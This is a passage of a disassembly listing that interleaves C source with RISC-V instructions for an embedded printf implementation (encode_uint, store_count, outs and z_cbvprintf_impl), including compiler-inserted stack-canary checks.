80002aba:	04fb8b63          	beq	s7,a5,80002b10 <encode_uint+0xa0>
			: upcase ? ('A' + lsv - 10) : ('a' + lsv - 10);
80002abe:	0ff57793          	zext.b	a5,a0
		*--bp = (lsv <= 9) ? ('0' + lsv)
80002ac2:	05778793          	addi	a5,a5,87
80002ac6:	0ff7f793          	zext.b	a5,a5
80002aca:	14fd                	addi	s1,s1,-1
80002acc:	00f48023          	sb	a5,0(s1)
		value /= radix;
80002ad0:	864a                	mv	a2,s2
80002ad2:	4681                	li	a3,0
80002ad4:	854e                	mv	a0,s3
80002ad6:	85a2                	mv	a1,s0
80002ad8:	e90fd0ef          	jal	ra,80000168 <__udivdi3>
	} while ((value != 0) && (bps < bp));
80002adc:	05446363          	bltu	s0,s4,80002b22 <encode_uint+0xb2>
80002ae0:	028a0f63          	beq	s4,s0,80002b1e <encode_uint+0xae>
80002ae4:	029aff63          	bgeu	s5,s1,80002b22 <encode_uint+0xb2>
		value /= radix;
80002ae8:	89aa                	mv	s3,a0
80002aea:	842e                	mv	s0,a1
		unsigned int lsv = (unsigned int)(value % radix);
80002aec:	8b4a                	mv	s6,s2
80002aee:	4a01                	li	s4,0
80002af0:	864a                	mv	a2,s2
80002af2:	4681                	li	a3,0
80002af4:	854e                	mv	a0,s3
80002af6:	85a2                	mv	a1,s0
80002af8:	9cffd0ef          	jal	ra,800004c6 <__umoddi3>
		*--bp = (lsv <= 9) ? ('0' + lsv)
80002afc:	47a5                	li	a5,9
80002afe:	faa7ede3          	bltu	a5,a0,80002ab8 <encode_uint+0x48>
80002b02:	0ff57793          	zext.b	a5,a0
80002b06:	03078793          	addi	a5,a5,48
80002b0a:	0ff7f793          	zext.b	a5,a5
80002b0e:	bf75                	j	80002aca <encode_uint+0x5a>
			: upcase ? ('A' + lsv - 10) : ('a' + lsv - 10);
80002b10:	0ff57793          	zext.b	a5,a0
		*--bp = (lsv <= 9) ? ('0' + lsv)
80002b14:	03778793          	addi	a5,a5,55
80002b18:	0ff7f793          	zext.b	a5,a5
80002b1c:	b77d                	j	80002aca <encode_uint+0x5a>
	} while ((value != 0) && (bps < bp));
80002b1e:	fd69f3e3          	bgeu	s3,s6,80002ae4 <encode_uint+0x74>

	/* Record required alternate forms.  This can be determined
	 * from the radix without re-checking specifier.
	 */
	if (conv->flag_hash) {
80002b22:	000c5783          	lhu	a5,0(s8)
80002b26:	0207f793          	andi	a5,a5,32
80002b2a:	c799                	beqz	a5,80002b38 <encode_uint+0xc8>
		if (radix == 8) {
80002b2c:	47a1                	li	a5,8
80002b2e:	02f90a63          	beq	s2,a5,80002b62 <encode_uint+0xf2>
			conv->altform_0 = true;
		} else if (radix == 16) {
80002b32:	47c1                	li	a5,16
80002b34:	02f90e63          	beq	s2,a5,80002b70 <encode_uint+0x100>
			;
		}
	}

	return bp;
}
80002b38:	8000c7b7          	lui	a5,0x8000c
80002b3c:	4732                	lw	a4,12(sp)
80002b3e:	9507a783          	lw	a5,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80002b42:	8fb9                	xor	a5,a5,a4
80002b44:	4701                	li	a4,0
80002b46:	ef85                	bnez	a5,80002b7e <encode_uint+0x10e>
80002b48:	8526                	mv	a0,s1
80002b4a:	50f2                	lw	ra,60(sp)
80002b4c:	5462                	lw	s0,56(sp)
80002b4e:	54d2                	lw	s1,52(sp)
80002b50:	5942                	lw	s2,48(sp)
80002b52:	59b2                	lw	s3,44(sp)
80002b54:	5a22                	lw	s4,40(sp)
80002b56:	5a92                	lw	s5,36(sp)
80002b58:	5b02                	lw	s6,32(sp)
80002b5a:	4bf2                	lw	s7,28(sp)
80002b5c:	4c62                	lw	s8,24(sp)
80002b5e:	6121                	addi	sp,sp,64
80002b60:	8082                	ret
			conv->altform_0 = true;
80002b62:	002c4783          	lbu	a5,2(s8)
80002b66:	0087e793          	ori	a5,a5,8
80002b6a:	00fc0123          	sb	a5,2(s8)
80002b6e:	b7e9                	j	80002b38 <encode_uint+0xc8>
			conv->altform_0c = true;
80002b70:	002c4783          	lbu	a5,2(s8)
80002b74:	0107e793          	ori	a5,a5,16
80002b78:	00fc0123          	sb	a5,2(s8)
80002b7c:	bf75                	j	80002b38 <encode_uint+0xc8>
}
80002b7e:	174030ef          	jal	ra,80005cf2 <_StackCheckHandler>

80002b82 <store_count>:
 * @param count the count to be stored.
 */
static inline void store_count(const struct conversion *conv,
			       void *dp,
			       int count)
{
80002b82:	1101                	addi	sp,sp,-32
80002b84:	ce06                	sw	ra,28(sp)
80002b86:	8000c7b7          	lui	a5,0x8000c
80002b8a:	9507a703          	lw	a4,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80002b8e:	c63a                	sw	a4,12(sp)
80002b90:	4701                	li	a4,0
	switch ((enum length_mod_enum)conv->length_mod) {
80002b92:	411c                	lw	a5,0(a0)
80002b94:	83ad                	srli	a5,a5,0xb
80002b96:	8bbd                	andi	a5,a5,15
80002b98:	471d                	li	a4,7
80002b9a:	00f76b63          	bltu	a4,a5,80002bb0 <store_count+0x2e>
80002b9e:	078a                	slli	a5,a5,0x2
80002ba0:	80008737          	lui	a4,0x80008
80002ba4:	e6c70713          	addi	a4,a4,-404 # 80007e6c <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80007e6d>
80002ba8:	97ba                	add	a5,a5,a4
80002baa:	439c                	lw	a5,0(a5)
80002bac:	8782                	jr	a5
	case LENGTH_NONE:
		*(int *)dp = count;
80002bae:	c190                	sw	a2,0(a1)
		 * Static analysis tool won't raise a violation if default is empty,
		 * but has that comment.
		 */
		break;
	}
}
80002bb0:	8000c7b7          	lui	a5,0x8000c
80002bb4:	4732                	lw	a4,12(sp)
80002bb6:	9507a783          	lw	a5,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80002bba:	8fb9                	xor	a5,a5,a4
80002bbc:	4701                	li	a4,0
80002bbe:	eb95                	bnez	a5,80002bf2 <store_count+0x70>
80002bc0:	40f2                	lw	ra,28(sp)
80002bc2:	6105                	addi	sp,sp,32
80002bc4:	8082                	ret
		*(signed char *)dp = (signed char)count;
80002bc6:	00c58023          	sb	a2,0(a1)
		break;
80002bca:	b7dd                	j	80002bb0 <store_count+0x2e>
		*(short *)dp = (short)count;
80002bcc:	00c59023          	sh	a2,0(a1)
		break;
80002bd0:	b7c5                	j	80002bb0 <store_count+0x2e>
		*(long *)dp = (long)count;
80002bd2:	c190                	sw	a2,0(a1)
		break;
80002bd4:	bff1                	j	80002bb0 <store_count+0x2e>
		*(long long *)dp = (long long)count;
80002bd6:	41f65793          	srai	a5,a2,0x1f
80002bda:	c190                	sw	a2,0(a1)
80002bdc:	c1dc                	sw	a5,4(a1)
		break;
80002bde:	bfc9                	j	80002bb0 <store_count+0x2e>
		*(intmax_t *)dp = (intmax_t)count;
80002be0:	41f65793          	srai	a5,a2,0x1f
80002be4:	c190                	sw	a2,0(a1)
80002be6:	c1dc                	sw	a5,4(a1)
		break;
80002be8:	b7e1                	j	80002bb0 <store_count+0x2e>
		*(size_t *)dp = (size_t)count;
80002bea:	c190                	sw	a2,0(a1)
		break;
80002bec:	b7d1                	j	80002bb0 <store_count+0x2e>
		*(ptrdiff_t *)dp = (ptrdiff_t)count;
80002bee:	c190                	sw	a2,0(a1)
}
80002bf0:	b7c1                	j	80002bb0 <store_count+0x2e>
80002bf2:	100030ef          	jal	ra,80005cf2 <_StackCheckHandler>

80002bf6 <outs>:
/* Outline function to emit all characters in [sp, ep). */
static int outs(cbprintf_cb out,
		void *ctx,
		const char *sp,
		const char *ep)
{
80002bf6:	7179                	addi	sp,sp,-48
80002bf8:	d606                	sw	ra,44(sp)
80002bfa:	d422                	sw	s0,40(sp)
80002bfc:	d226                	sw	s1,36(sp)
80002bfe:	d04a                	sw	s2,32(sp)
80002c00:	ce4e                	sw	s3,28(sp)
80002c02:	cc52                	sw	s4,24(sp)
80002c04:	8a2a                	mv	s4,a0
80002c06:	89ae                	mv	s3,a1
80002c08:	8936                	mv	s2,a3
80002c0a:	8000c7b7          	lui	a5,0x8000c
80002c0e:	9507a703          	lw	a4,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80002c12:	c63a                	sw	a4,12(sp)
80002c14:	4701                	li	a4,0
	size_t count = 0;
80002c16:	4401                	li	s0,0

	while ((sp < ep) || ((ep == NULL) && *sp)) {
80002c18:	a819                	j	80002c2e <outs+0x38>
		int rc = out((int)*sp++, ctx);
80002c1a:	00160493          	addi	s1,a2,1
80002c1e:	85ce                	mv	a1,s3
80002c20:	00064503          	lbu	a0,0(a2)
80002c24:	9a02                	jalr	s4

		if (rc < 0) {
80002c26:	00054c63          	bltz	a0,80002c3e <outs+0x48>
			return rc;
		}
		++count;
80002c2a:	0405                	addi	s0,s0,1
		int rc = out((int)*sp++, ctx);
80002c2c:	8626                	mv	a2,s1
	while ((sp < ep) || ((ep == NULL) && *sp)) {
80002c2e:	ff2666e3          	bltu	a2,s2,80002c1a <outs+0x24>
80002c32:	00091563          	bnez	s2,80002c3c <outs+0x46>
80002c36:	00064783          	lbu	a5,0(a2)
80002c3a:	f3e5                	bnez	a5,80002c1a <outs+0x24>
	}

	return (int)count;
80002c3c:	8522                	mv	a0,s0
}
80002c3e:	8000c7b7          	lui	a5,0x8000c
80002c42:	4732                	lw	a4,12(sp)
80002c44:	9507a783          	lw	a5,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80002c48:	8fb9                	xor	a5,a5,a4
80002c4a:	4701                	li	a4,0
80002c4c:	eb89                	bnez	a5,80002c5e <outs+0x68>
80002c4e:	50b2                	lw	ra,44(sp)
80002c50:	5422                	lw	s0,40(sp)
80002c52:	5492                	lw	s1,36(sp)
80002c54:	5902                	lw	s2,32(sp)
80002c56:	49f2                	lw	s3,28(sp)
80002c58:	4a62                	lw	s4,24(sp)
80002c5a:	6145                	addi	sp,sp,48
80002c5c:	8082                	ret
80002c5e:	094030ef          	jal	ra,80005cf2 <_StackCheckHandler>

80002c62 <z_cbvprintf_impl>:

int z_cbvprintf_impl(cbprintf_cb out, void *ctx, const char *fp,
		     va_list ap, uint32_t flags)
{
80002c62:	7119                	addi	sp,sp,-128
80002c64:	de86                	sw	ra,124(sp)
80002c66:	dca2                	sw	s0,120(sp)
80002c68:	daa6                	sw	s1,116(sp)
80002c6a:	d8ca                	sw	s2,112(sp)
80002c6c:	d6ce                	sw	s3,108(sp)
80002c6e:	d4d2                	sw	s4,104(sp)
80002c70:	d2d6                	sw	s5,100(sp)
80002c72:	d0da                	sw	s6,96(sp)
80002c74:	cede                	sw	s7,92(sp)
80002c76:	cce2                	sw	s8,88(sp)
80002c78:	892a                	mv	s2,a0
80002c7a:	84ae                	mv	s1,a1
80002c7c:	8ab2                	mv	s5,a2
80002c7e:	c636                	sw	a3,12(sp)
80002c80:	8000c7b7          	lui	a5,0x8000c
80002c84:	9507a703          	lw	a4,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80002c88:	c6ba                	sw	a4,76(sp)
80002c8a:	4701                	li	a4,0
	char buf[CONVERTED_BUFLEN];
	size_t count = 0;
80002c8c:	4401                	li	s0,0
		return rc; \
	} \
	count += rc; \
} while (false)

	while (*fp != 0) {
80002c8e:	000ac503          	lbu	a0,0(s5)
80002c92:	50050263          	beqz	a0,80003196 <z_cbvprintf_impl+0x534>
		if (*fp != '%') {
80002c96:	02500793          	li	a5,37
80002c9a:	00f50963          	beq	a0,a5,80002cac <z_cbvprintf_impl+0x4a>
			OUTC(*fp++);
80002c9e:	0a85                	addi	s5,s5,1
80002ca0:	85a6                	mv	a1,s1
80002ca2:	9902                	jalr	s2
80002ca4:	4e054a63          	bltz	a0,80003198 <z_cbvprintf_impl+0x536>
80002ca8:	0405                	addi	s0,s0,1
			continue;
80002caa:	b7d5                	j	80002c8e <z_cbvprintf_impl+0x2c>
		 * mitigate LLVM code generation bug.
		 */
		struct {
			union argument_value value;
			struct conversion conv;
		} state = {
80002cac:	c802                	sw	zero,16(sp)
80002cae:	ca02                	sw	zero,20(sp)
80002cb0:	cc02                	sw	zero,24(sp)
80002cb2:	ce02                	sw	zero,28(sp)
80002cb4:	d002                	sw	zero,32(sp)
80002cb6:	d202                	sw	zero,36(sp)
80002cb8:	d402                	sw	zero,40(sp)
80002cba:	d602                	sw	zero,44(sp)
		int precision = -1;
		const char *bps = NULL;
		const char *bpe = buf + sizeof(buf);
		char sign = 0;

		fp = extract_conversion(conv, sp);
80002cbc:	85d6                	mv	a1,s5
80002cbe:	1008                	addi	a0,sp,32
80002cc0:	39e9                	jal	8000299a <extract_conversion>
80002cc2:	89aa                	mv	s3,a0

		/* If dynamic width is specified, process it,
		 * otherwise set width if present.
		 */
		if (conv->width_star) {
80002cc4:	02015783          	lhu	a5,32(sp)
80002cc8:	1007f713          	andi	a4,a5,256
80002ccc:	cb59                	beqz	a4,80002d62 <z_cbvprintf_impl+0x100>
			width = va_arg(ap, int);
80002cce:	47b2                	lw	a5,12(sp)
80002cd0:	00478713          	addi	a4,a5,4
80002cd4:	c63a                	sw	a4,12(sp)
80002cd6:	0007aa03          	lw	s4,0(a5)

			if (width < 0) {
80002cda:	060a4b63          	bltz	s4,80002d50 <z_cbvprintf_impl+0xee>

		/* If dynamic precision is specified, process it, otherwise
		 * set precision if present.  For floating point where
		 * precision is not present use 6.
		 */
		if (conv->prec_star) {
80002cde:	02015783          	lhu	a5,32(sp)
80002ce2:	4007f713          	andi	a4,a5,1024
80002ce6:	cf49                	beqz	a4,80002d80 <z_cbvprintf_impl+0x11e>
			int arg = va_arg(ap, int);
80002ce8:	47b2                	lw	a5,12(sp)
80002cea:	00478713          	addi	a4,a5,4
80002cee:	c63a                	sw	a4,12(sp)
80002cf0:	0007ab03          	lw	s6,0(a5)

			if (arg < 0) {
80002cf4:	060b4e63          	bltz	s6,80002d70 <z_cbvprintf_impl+0x10e>
		}

		/* Reuse width and precision memory in conv for value
		 * padding counts.
		 */
		conv->pad0_value = 0;
80002cf8:	d202                	sw	zero,36(sp)
		conv->pad0_pre_exp = 0;
80002cfa:	d402                	sw	zero,40(sp)
		 * This can't be extracted to a helper function because
		 * passing a pointer to va_list doesn't work on x86_64.  See
		 * https://stackoverflow.com/a/8048892.
		 */
		enum specifier_cat_enum specifier_cat
			= (enum specifier_cat_enum)conv->specifier_cat;
80002cfc:	5782                	lw	a5,32(sp)
80002cfe:	0107d713          	srli	a4,a5,0x10
80002d02:	8b1d                	andi	a4,a4,7
		enum length_mod_enum length_mod
			= (enum length_mod_enum)conv->length_mod;
80002d04:	83ad                	srli	a5,a5,0xb
80002d06:	8bbd                	andi	a5,a5,15
		enum length_mod_enum length_mod
80002d08:	86be                	mv	a3,a5
		/* Extract the value based on the argument category and length.
		 *
		 * Note that the length modifier doesn't affect the value of a
		 * pointer argument.
		 */
		if (specifier_cat == SPECIFIER_SINT) {
80002d0a:	4605                	li	a2,1
80002d0c:	08c70163          	beq	a4,a2,80002d8e <z_cbvprintf_impl+0x12c>
			if (length_mod == LENGTH_HH) {
				value->sint = (signed char)value->sint;
			} else if (length_mod == LENGTH_H) {
				value->sint = (short)value->sint;
			}
		} else if (specifier_cat == SPECIFIER_UINT) {
80002d10:	4609                	li	a2,2
80002d12:	14c70563          	beq	a4,a2,80002e5c <z_cbvprintf_impl+0x1fa>
			if (length_mod == LENGTH_HH) {
				value->uint = (unsigned char)value->uint;
			} else if (length_mod == LENGTH_H) {
				value->uint = (unsigned short)value->uint;
			}
		} else if (specifier_cat == SPECIFIER_FP) {
80002d16:	4791                	li	a5,4
80002d18:	1cf70f63          	beq	a4,a5,80002ef6 <z_cbvprintf_impl+0x294>
			if (length_mod == LENGTH_UPPER_L) {
				value->ldbl = va_arg(ap, long double);
			} else {
				value->dbl = va_arg(ap, double);
			}
		} else if (specifier_cat == SPECIFIER_PTR) {
80002d1c:	478d                	li	a5,3
80002d1e:	20f70863          	beq	a4,a5,80002f2e <z_cbvprintf_impl+0x2cc>
		/* We've now consumed all arguments related to this
		 * specification.  If the conversion is invalid, or is
		 * something we don't support, then output the original
		 * specification and move on.
		 */
		if (conv->invalid || conv->unsupported) {
80002d22:	5782                	lw	a5,32(sp)
80002d24:	8b8d                	andi	a5,a5,3
80002d26:	20079b63          	bnez	a5,80002f3c <z_cbvprintf_impl+0x2da>
		}

		/* Do formatting, either into the buffer or
		 * referencing external data.
		 */
		switch (conv->specifier) {
80002d2a:	02314783          	lbu	a5,35(sp)
80002d2e:	fdb78793          	addi	a5,a5,-37
80002d32:	0ff7f693          	zext.b	a3,a5
80002d36:	05300713          	li	a4,83
80002d3a:	32d76863          	bltu	a4,a3,8000306a <z_cbvprintf_impl+0x408>
80002d3e:	00269793          	slli	a5,a3,0x2
80002d42:	80008737          	lui	a4,0x80008
80002d46:	e9470713          	addi	a4,a4,-364 # 80007e94 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80007e95>
80002d4a:	97ba                	add	a5,a5,a4
80002d4c:	439c                	lw	a5,0(a5)
80002d4e:	8782                	jr	a5
				conv->flag_dash = true;
80002d50:	02015783          	lhu	a5,32(sp)
80002d54:	0047e793          	ori	a5,a5,4
80002d58:	02f11023          	sh	a5,32(sp)
				width = -width;
80002d5c:	41400a33          	neg	s4,s4
80002d60:	bfbd                	j	80002cde <z_cbvprintf_impl+0x7c>
		} else if (conv->width_present) {
80002d62:	0807f793          	andi	a5,a5,128
80002d66:	c399                	beqz	a5,80002d6c <z_cbvprintf_impl+0x10a>
			width = conv->width_value;
80002d68:	5a12                	lw	s4,36(sp)
80002d6a:	bf95                	j	80002cde <z_cbvprintf_impl+0x7c>
		int width = -1;
80002d6c:	5a7d                	li	s4,-1
80002d6e:	bf85                	j	80002cde <z_cbvprintf_impl+0x7c>
				conv->prec_present = false;
80002d70:	02015783          	lhu	a5,32(sp)
80002d74:	dff7f793          	andi	a5,a5,-513
80002d78:	02f11023          	sh	a5,32(sp)
		int precision = -1;
80002d7c:	5b7d                	li	s6,-1
80002d7e:	bfad                	j	80002cf8 <z_cbvprintf_impl+0x96>
		} else if (conv->prec_present) {
80002d80:	2007f793          	andi	a5,a5,512
80002d84:	c399                	beqz	a5,80002d8a <z_cbvprintf_impl+0x128>
			precision = conv->prec_value;
80002d86:	5b22                	lw	s6,40(sp)
80002d88:	bf85                	j	80002cf8 <z_cbvprintf_impl+0x96>
		int precision = -1;
80002d8a:	5b7d                	li	s6,-1
80002d8c:	b7b5                	j	80002cf8 <z_cbvprintf_impl+0x96>
			switch (length_mod) {
80002d8e:	4715                	li	a4,5
80002d90:	0ae78463          	beq	a5,a4,80002e38 <z_cbvprintf_impl+0x1d6>
80002d94:	02f76363          	bltu	a4,a5,80002dba <z_cbvprintf_impl+0x158>
80002d98:	470d                	li	a4,3
80002d9a:	06e78563          	beq	a5,a4,80002e04 <z_cbvprintf_impl+0x1a2>
80002d9e:	4711                	li	a4,4
80002da0:	02e79c63          	bne	a5,a4,80002dd8 <z_cbvprintf_impl+0x176>
					(sint_value_type)va_arg(ap, long long);
80002da4:	47b2                	lw	a5,12(sp)
80002da6:	079d                	addi	a5,a5,7
80002da8:	9be1                	andi	a5,a5,-8
80002daa:	00878713          	addi	a4,a5,8
80002dae:	c63a                	sw	a4,12(sp)
80002db0:	4398                	lw	a4,0(a5)
80002db2:	43dc                	lw	a5,4(a5)
				value->sint =
80002db4:	c83a                	sw	a4,16(sp)
80002db6:	ca3e                	sw	a5,20(sp)
				break;
80002db8:	a80d                	j	80002dea <z_cbvprintf_impl+0x188>
			switch (length_mod) {
80002dba:	07a9                	addi	a5,a5,10
80002dbc:	8bbd                	andi	a5,a5,15
80002dbe:	4705                	li	a4,1
80002dc0:	00f76c63          	bltu	a4,a5,80002dd8 <z_cbvprintf_impl+0x176>
					(sint_value_type)va_arg(ap, ptrdiff_t);
80002dc4:	47b2                	lw	a5,12(sp)
80002dc6:	00478713          	addi	a4,a5,4
80002dca:	c63a                	sw	a4,12(sp)
80002dcc:	439c                	lw	a5,0(a5)
80002dce:	41f7d713          	srai	a4,a5,0x1f
				value->sint =
80002dd2:	c83e                	sw	a5,16(sp)
80002dd4:	ca3a                	sw	a4,20(sp)
				break;
80002dd6:	a811                	j	80002dea <z_cbvprintf_impl+0x188>
				value->sint = va_arg(ap, int);
80002dd8:	47b2                	lw	a5,12(sp)
80002dda:	00478713          	addi	a4,a5,4
80002dde:	c63a                	sw	a4,12(sp)
80002de0:	439c                	lw	a5,0(a5)
80002de2:	41f7d713          	srai	a4,a5,0x1f
80002de6:	c83e                	sw	a5,16(sp)
80002de8:	ca3a                	sw	a4,20(sp)
			if (length_mod == LENGTH_HH) {
80002dea:	4785                	li	a5,1
80002dec:	06f68163          	beq	a3,a5,80002e4e <z_cbvprintf_impl+0x1ec>
			} else if (length_mod == LENGTH_H) {
80002df0:	4789                	li	a5,2
80002df2:	f2f698e3          	bne	a3,a5,80002d22 <z_cbvprintf_impl+0xc0>
				value->sint = (short)value->sint;
80002df6:	01011783          	lh	a5,16(sp)
80002dfa:	41f7d713          	srai	a4,a5,0x1f
80002dfe:	c83e                	sw	a5,16(sp)
80002e00:	ca3a                	sw	a4,20(sp)
80002e02:	b705                	j	80002d22 <z_cbvprintf_impl+0xc0>
				    && (conv->specifier == 'c')) {
80002e04:	02314703          	lbu	a4,35(sp)
				if (WCHAR_IS_SIGNED
80002e08:	06300793          	li	a5,99
80002e0c:	00f70c63          	beq	a4,a5,80002e24 <z_cbvprintf_impl+0x1c2>
					value->sint = va_arg(ap, long);
80002e10:	47b2                	lw	a5,12(sp)
80002e12:	00478713          	addi	a4,a5,4
80002e16:	c63a                	sw	a4,12(sp)
80002e18:	439c                	lw	a5,0(a5)
80002e1a:	41f7d713          	srai	a4,a5,0x1f
80002e1e:	c83e                	sw	a5,16(sp)
80002e20:	ca3a                	sw	a4,20(sp)
80002e22:	b7e1                	j	80002dea <z_cbvprintf_impl+0x188>
					value->sint = (wchar_t)va_arg(ap,
80002e24:	47b2                	lw	a5,12(sp)
80002e26:	00478713          	addi	a4,a5,4
80002e2a:	c63a                	sw	a4,12(sp)
80002e2c:	439c                	lw	a5,0(a5)
80002e2e:	41f7d713          	srai	a4,a5,0x1f
80002e32:	c83e                	sw	a5,16(sp)
80002e34:	ca3a                	sw	a4,20(sp)
80002e36:	bf55                	j	80002dea <z_cbvprintf_impl+0x188>
					(sint_value_type)va_arg(ap, intmax_t);
80002e38:	47b2                	lw	a5,12(sp)
80002e3a:	079d                	addi	a5,a5,7
80002e3c:	9be1                	andi	a5,a5,-8
80002e3e:	00878713          	addi	a4,a5,8
80002e42:	c63a                	sw	a4,12(sp)
80002e44:	4398                	lw	a4,0(a5)
80002e46:	43dc                	lw	a5,4(a5)
				value->sint =
80002e48:	c83a                	sw	a4,16(sp)
80002e4a:	ca3e                	sw	a5,20(sp)
				break;
80002e4c:	bf79                	j	80002dea <z_cbvprintf_impl+0x188>
				value->sint = (signed char)value->sint;
80002e4e:	01010783          	lb	a5,16(sp)
80002e52:	41f7d713          	srai	a4,a5,0x1f
80002e56:	c83e                	sw	a5,16(sp)
80002e58:	ca3a                	sw	a4,20(sp)
80002e5a:	b5e1                	j	80002d22 <z_cbvprintf_impl+0xc0>
			switch (length_mod) {
80002e5c:	4715                	li	a4,5
80002e5e:	06e78c63          	beq	a5,a4,80002ed6 <z_cbvprintf_impl+0x274>
80002e62:	02f76363          	bltu	a4,a5,80002e88 <z_cbvprintf_impl+0x226>
80002e66:	470d                	li	a4,3
80002e68:	04e78f63          	beq	a5,a4,80002ec6 <z_cbvprintf_impl+0x264>
80002e6c:	4711                	li	a4,4
80002e6e:	02e79a63          	bne	a5,a4,80002ea2 <z_cbvprintf_impl+0x240>
					(uint_value_type)va_arg(ap,
80002e72:	47b2                	lw	a5,12(sp)
80002e74:	079d                	addi	a5,a5,7
80002e76:	9be1                	andi	a5,a5,-8
80002e78:	00878713          	addi	a4,a5,8
80002e7c:	c63a                	sw	a4,12(sp)
80002e7e:	4398                	lw	a4,0(a5)
80002e80:	43dc                	lw	a5,4(a5)
				value->uint =
80002e82:	c83a                	sw	a4,16(sp)
80002e84:	ca3e                	sw	a5,20(sp)
				break;
80002e86:	a02d                	j	80002eb0 <z_cbvprintf_impl+0x24e>
			switch (length_mod) {
80002e88:	07a9                	addi	a5,a5,10
80002e8a:	8bbd                	andi	a5,a5,15
80002e8c:	4705                	li	a4,1
80002e8e:	00f76a63          	bltu	a4,a5,80002ea2 <z_cbvprintf_impl+0x240>
					(uint_value_type)va_arg(ap, size_t);
80002e92:	47b2                	lw	a5,12(sp)
80002e94:	00478713          	addi	a4,a5,4
80002e98:	c63a                	sw	a4,12(sp)
80002e9a:	439c                	lw	a5,0(a5)
				value->uint =
80002e9c:	c83e                	sw	a5,16(sp)
80002e9e:	ca02                	sw	zero,20(sp)
				break;
80002ea0:	a801                	j	80002eb0 <z_cbvprintf_impl+0x24e>
				value->uint = va_arg(ap, unsigned int);
80002ea2:	47b2                	lw	a5,12(sp)
80002ea4:	00478713          	addi	a4,a5,4
80002ea8:	c63a                	sw	a4,12(sp)
80002eaa:	439c                	lw	a5,0(a5)
80002eac:	c83e                	sw	a5,16(sp)
80002eae:	ca02                	sw	zero,20(sp)
			if (length_mod == LENGTH_HH) {
80002eb0:	4785                	li	a5,1
80002eb2:	02f68d63          	beq	a3,a5,80002eec <z_cbvprintf_impl+0x28a>
			} else if (length_mod == LENGTH_H) {
80002eb6:	4789                	li	a5,2
80002eb8:	e6f695e3          	bne	a3,a5,80002d22 <z_cbvprintf_impl+0xc0>
				value->uint = (unsigned short)value->uint;
80002ebc:	01015783          	lhu	a5,16(sp)
80002ec0:	c83e                	sw	a5,16(sp)
80002ec2:	ca02                	sw	zero,20(sp)
80002ec4:	bdb9                	j	80002d22 <z_cbvprintf_impl+0xc0>
					value->uint = va_arg(ap, unsigned long);
80002ec6:	47b2                	lw	a5,12(sp)
80002ec8:	00478713          	addi	a4,a5,4
80002ecc:	c63a                	sw	a4,12(sp)
80002ece:	439c                	lw	a5,0(a5)
80002ed0:	c83e                	sw	a5,16(sp)
80002ed2:	ca02                	sw	zero,20(sp)
				break;
80002ed4:	bff1                	j	80002eb0 <z_cbvprintf_impl+0x24e>
					(uint_value_type)va_arg(ap,
80002ed6:	47b2                	lw	a5,12(sp)
80002ed8:	079d                	addi	a5,a5,7
80002eda:	9be1                	andi	a5,a5,-8
80002edc:	00878713          	addi	a4,a5,8
80002ee0:	c63a                	sw	a4,12(sp)
80002ee2:	4398                	lw	a4,0(a5)
80002ee4:	43dc                	lw	a5,4(a5)
				value->uint =
80002ee6:	c83a                	sw	a4,16(sp)
80002ee8:	ca3e                	sw	a5,20(sp)
				break;
80002eea:	b7d9                	j	80002eb0 <z_cbvprintf_impl+0x24e>
				value->uint = (unsigned char)value->uint;
80002eec:	01014783          	lbu	a5,16(sp)
80002ef0:	c83e                	sw	a5,16(sp)
80002ef2:	ca02                	sw	zero,20(sp)
80002ef4:	b53d                	j	80002d22 <z_cbvprintf_impl+0xc0>
			if (length_mod == LENGTH_UPPER_L) {
80002ef6:	47a1                	li	a5,8
80002ef8:	00f68d63          	beq	a3,a5,80002f12 <z_cbvprintf_impl+0x2b0>
				value->dbl = va_arg(ap, double);
80002efc:	47b2                	lw	a5,12(sp)
80002efe:	079d                	addi	a5,a5,7
80002f00:	9be1                	andi	a5,a5,-8
80002f02:	00878713          	addi	a4,a5,8
80002f06:	c63a                	sw	a4,12(sp)
80002f08:	4398                	lw	a4,0(a5)
80002f0a:	43dc                	lw	a5,4(a5)
80002f0c:	c83a                	sw	a4,16(sp)
80002f0e:	ca3e                	sw	a5,20(sp)
80002f10:	bd09                	j	80002d22 <z_cbvprintf_impl+0xc0>
				value->ldbl = va_arg(ap, long double);
80002f12:	47b2                	lw	a5,12(sp)
80002f14:	00478713          	addi	a4,a5,4
80002f18:	c63a                	sw	a4,12(sp)
80002f1a:	439c                	lw	a5,0(a5)
80002f1c:	4390                	lw	a2,0(a5)
80002f1e:	43d4                	lw	a3,4(a5)
80002f20:	4798                	lw	a4,8(a5)
80002f22:	47dc                	lw	a5,12(a5)
80002f24:	c832                	sw	a2,16(sp)
80002f26:	ca36                	sw	a3,20(sp)
80002f28:	cc3a                	sw	a4,24(sp)
80002f2a:	ce3e                	sw	a5,28(sp)
80002f2c:	bbdd                	j	80002d22 <z_cbvprintf_impl+0xc0>
			value->ptr = va_arg(ap, void *);
80002f2e:	47b2                	lw	a5,12(sp)
80002f30:	00478713          	addi	a4,a5,4
80002f34:	c63a                	sw	a4,12(sp)
80002f36:	439c                	lw	a5,0(a5)
80002f38:	c83e                	sw	a5,16(sp)
80002f3a:	b3e5                	j	80002d22 <z_cbvprintf_impl+0xc0>
			OUTS(sp, fp);
80002f3c:	86ce                	mv	a3,s3
80002f3e:	8656                	mv	a2,s5
80002f40:	85a6                	mv	a1,s1
80002f42:	854a                	mv	a0,s2
80002f44:	394d                	jal	80002bf6 <outs>
80002f46:	24054963          	bltz	a0,80003198 <z_cbvprintf_impl+0x536>
80002f4a:	942a                	add	s0,s0,a0
		fp = extract_conversion(conv, sp);
80002f4c:	8ace                	mv	s5,s3
			continue;
80002f4e:	b381                	j	80002c8e <z_cbvprintf_impl+0x2c>
		case '%':
			OUTC('%');
80002f50:	85a6                	mv	a1,s1
80002f52:	02500513          	li	a0,37
80002f56:	9902                	jalr	s2
80002f58:	24054063          	bltz	a0,80003198 <z_cbvprintf_impl+0x536>
